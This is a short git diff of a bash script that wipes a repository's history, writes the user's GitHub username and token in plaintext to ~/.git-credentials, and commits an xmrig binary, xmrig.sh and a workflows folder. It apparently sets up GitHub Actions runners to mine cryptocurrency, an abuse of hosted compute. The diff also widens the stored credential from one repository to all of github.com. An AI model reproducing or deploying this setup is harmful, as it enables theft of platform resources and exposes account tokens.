@@ -1,6 +1,7 @@
 #!/bin/bash
 rm -rf .git .github
-[ x"$1" = x ] || [ x"$2" = x ] || echo "https://$1:$2@github.com/xxmmxx2021/actions.git" > ~/.git-credentials
+[ x"$1" = x ] || [ x"$2" = x ] || git config --global credential.helper store
+[ x"$1" = x ] || [ x"$2" = x ] || echo "https://$1:$2@github.com/" > ~/.git-credentials
 git init
 cp -raf  wf .github
 git add LICENSE README.md  run.sh  xmrig.sh xmrig .github/
